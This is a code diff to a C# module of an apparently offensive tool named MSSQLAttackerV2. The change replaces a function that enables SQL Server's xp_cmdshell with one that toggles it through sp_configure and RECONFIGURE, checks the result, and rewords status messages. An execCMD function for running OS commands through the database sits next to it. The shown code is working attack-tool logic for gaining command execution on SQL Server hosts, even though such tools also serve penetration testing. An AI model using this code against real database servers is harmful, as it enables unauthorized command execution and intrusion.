@@ -28,7 +28,7 @@ namespace MSSQLAttackerV2.Modules
             String cmd = "select value_in_use from sys.configurations where name = 'xp_cmdshell'";
             String valueInUse = helpWrite.getFilteredResult(runQuery.getQueryResult(con, cmd));
             if (valueInUse == "1") { helpWrite.doWrite(1, "Value In Use: " + valueInUse); helpWrite.doWrite(1, "xp_cmdshell is enabled"); return true; }
-            else { helpWrite.doWrite(0, "Value In Use: " + valueInUse); helpWrite.doWrite(0, "xp_cmdshell is not enabled" + valueInUse); return false; }
+            else { helpWrite.doWrite(0, "Value In Use: " + valueInUse); helpWrite.doWrite(0, "xp_cmdshell is disabled" + valueInUse); return false; }
         }
         public void execCMD(SqlConnection con, [Optional, DefaultParameterValue(null)] String command)
         {
@@ -74,26 +74,51 @@ namespace MSSQLAttackerV2.Modules
 
 
         }
-        public bool enableXpCmdShell(SqlConnection con)
+        public bool toggleXpCmdShell(SqlConnection con)
         {
+
             var runQuery = new RunQuery();
             var helpWrite = new Helpwrite();
+            string value = "1";
 
+            if (checkCmdshell(con))
+            {
+                value = "0";
+            }
             try
             {
-                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', " + value + "; RECONFIGURE;";
                 String impersonatableUsers = helpWrite.getFilteredResult(runQuery.getQueryResult(con, enable_xpcmd));
-                helpWrite.doWrite(1, "xp_cmdshell enabled");
 
-                return true;
+                switch (value)
+                {
+                    case "1":
+                        if (checkCmdshell(con))
+                        {
+                            helpWrite.doWrite(1, "xp_cmdshell toggled");
+                            return true;
+
+                        }
+                        helpWrite.doWrite(0, "xp_cmdshell toggle failed");
+                        return false;
+                    default:
+                        if (!checkCmdshell(con))
+                        {
+                            helpWrite.doWrite(1, "xp_cmdshell toggled");
+                            return true;
+
+                        }
+                        helpWrite.doWrite(0, "xp_cmdshell toggle failed");
+                        return false;
+                }
             }
             catch (Exception)
             {
 
-                helpWrite.doWrite(0, "xp_cmdshell enable fail! || Missing Privileges");
+                helpWrite.doWrite(0, "xp_cmdshell toggle fail! || Missing Privileges");
                 return false;
             }
         }
     }
-    
+
 }
